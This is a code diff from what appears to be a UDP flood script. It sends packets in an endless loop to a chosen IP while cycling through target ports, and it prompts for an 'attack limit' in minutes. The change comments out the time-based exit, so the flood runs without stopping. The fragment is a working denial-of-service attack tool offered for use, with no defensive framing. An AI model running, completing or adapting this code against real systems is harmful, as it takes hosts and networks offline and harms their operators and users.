@@ -49,6 +49,8 @@ print()
 print
 limit = int(input('attack limit(minute): '))
 stopminute = minute + limit
+print(stopminute)
+
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
@@ -59,5 +61,5 @@ while True:
      if port == 65534:
        port = 1
      #if sent == limit:
-           if stopminute == nowminute: 
-          sys.exit()
+           #if stopminute == nowminute: 
+          #sys.exit()
